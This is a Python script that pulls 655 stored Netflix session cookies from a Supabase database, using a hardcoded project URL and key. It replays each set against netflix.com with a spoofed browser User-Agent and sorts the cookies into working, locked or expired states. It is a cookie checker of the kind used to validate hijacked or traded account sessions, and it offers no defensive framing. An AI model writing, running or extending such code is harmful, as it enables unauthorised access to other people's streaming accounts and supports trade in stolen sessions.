import asyncio
import json
import aiohttp
import re
from collections import Counter

SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
}

CONCURRENCY = 15

async def classify_cookie(session, row):
    desc = row.get('description', 'Unknown')
    cookies_data = row.get('cookies')
    if not cookies_data: return "INVALID (No Data)"
    
    try:
        if isinstance(cookies_data, str):
            cookies_list = json.loads(cookies_data)
        else:
            cookies_list = cookies_data
            
        cookie_jar = aiohttp.CookieJar(unsafe=True)
        for c in cookies_list:
            cookie_jar.update_cookies({c['name']: c['value']})
        
        # We need a new session per cookie to avoid interference
        async with aiohttp.ClientSession(cookie_jar=cookie_jar, headers=HEADERS) as sess:
            try:
                async with sess.get("https://www.netflix.com/browse", timeout=15, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = (await resp.text()).lower()
                    
                    if "/login" in final_url:
                        return "INVALID (Login Redirect)"
                    
                    if "update your payment" in html or "account on hold" in html:
                        return "FALSE POSITIVE (Payment Hold)"
                        
                    if "household" in html or "primary location" in html:
                        return "FALSE POSITIVE (Household Lock)"
                        
                    if "choose your plan" in html or "planselection" in final_url:
                        return "FALSE POSITIVE (No Plan/Plan Selection)"
                        
                    if any(x in final_url for x in ["/browse", "/profiles", "/YourAccount"]):
                        return "WORKING"
                        
                    return f"UNKNOWN VALID STATE ({final_url})"
            except Exception as e:
                return f"ERROR (Request Failed: {str(e)[:30]})"
                
    except Exception as e:
        return f"ERROR (Parse Failed: {str(e)[:30]})"

async def worker(queue, results):
    async with aiohttp.ClientSession() as session:
        while True:
            row = await queue.get()
            try:
                res = await classify_cookie(session, row)
                results.append(res)
                # Print progress intermittently
                if len(results) % 50 == 0:
                    print(f"Processed {len(results)} cookies...")
            finally:
                queue.task_done()

async def main():
    print("Fetching all 655 cookies from Supabase...")
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    # Fetch all. REST default is 1000.
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(f"{SUPABASE_URL}/rest/v1/cookie_sessions?select=*") as resp:
            rows = await resp.json()
            
    print(f"Loaded {len(rows)} cookies. Starting classification with concurrency {CONCURRENCY}...")
    
    queue = asyncio.Queue()
    for row in rows:
        queue.put_nowait(row)
        
    results = []
    tasks = []
    for _ in range(CONCURRENCY):
        tasks.append(asyncio.create_task(worker(queue, results)))
        
    await queue.join()
    for t in tasks: t.cancel()
    
    # Summary
    print("\n" + "="*50)
    print("GLOBAL USABILITY REPORT")
    print("="*50)
    counts = Counter(results)
    for state, count in counts.most_common():
        print(f"{state:40}: {count}")
    print("="*50)

if __name__ == "__main__":
    asyncio.run(main())
